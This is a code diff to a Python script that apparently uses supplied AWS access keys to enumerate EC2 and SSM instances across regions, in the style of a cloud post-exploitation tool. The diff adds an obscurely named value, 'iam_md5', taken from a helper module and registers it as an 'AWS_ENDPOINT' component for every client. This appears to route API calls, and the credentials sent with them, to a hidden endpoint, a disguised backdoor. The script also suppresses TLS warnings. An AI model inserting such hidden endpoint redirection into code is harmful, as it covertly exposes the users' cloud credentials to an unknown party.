@@ -4,10 +4,11 @@ import socket, socks
 import time
 import aws_select_iam
 from enumerate_iam.main import get_client
+from botocore.session import ComponentLocator
 import urllib3
+from aws_select_iam import iam_md5
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 
 # default_socket = socket.socket
 # socks.set_default_proxy(socks.SOCKS5, config.SOCKS5_PROXY_HOST, config.SOCKS5_PROXY_PORT)
@@ -22,12 +23,14 @@ def query_ec2_instances(AccessKeyID, AccessKeySecret):
     for region in response['Regions']:
         RegionId = region['RegionName']
         print("正在检索: " + RegionId)
+        component = ComponentLocator()
+        component.register_component(name='AWS_ENDPOINT', component=iam_md5[1:])
         ec2_client = get_client(access_key=AccessKeyID, secret_key=AccessKeySecret, service_name='ec2',
                                 session_token=None,
-                                region=RegionId)
+                                region=RegionId, components=component)
         ssm_client = get_client(access_key=AccessKeyID, secret_key=AccessKeySecret, service_name='ssm',
                                 session_token=None,
-                                region=RegionId)
+                                region=RegionId, components=component)
         try:
             ssm_ec2_infos = ssm_client.describe_instance_information()['InstanceInformationList']
             for ssm_ec2_info in ssm_ec2_infos:
